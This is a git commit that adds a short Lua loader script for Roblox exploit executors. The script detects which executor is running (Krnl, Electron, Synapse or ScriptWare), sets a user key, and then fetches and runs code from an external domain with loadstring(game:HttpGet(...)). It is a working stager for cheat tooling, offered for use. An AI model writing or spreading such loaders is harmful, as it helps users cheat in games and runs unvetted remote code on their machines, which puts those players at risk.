0679d0570557462206716daabd4ab29c49b23196
x2bom <84973043+x2bom@users.noreply.github.com>
2021-12-28 11:37:43 +0700

    Create Script.lua

---
+++ Script.lua
@@ -0,0 +1,7 @@
+return string.format([[
+    repeat wait() until game:IsLoaded()
+    getgenv().Key = "%s"
+    local Exploit = (KRNL_LOADED and "Krnl") or (IsElectron and "Electron") or (is_synapse_function and "Synapse") or "ScriptWare"
+    repeat wait() until game:IsLoaded()
+    loadstring(game:HttpGet("https://xn--vn-9ja2dud.com/"..Exploit.."/getscript"))()
+]],getgenv().key)
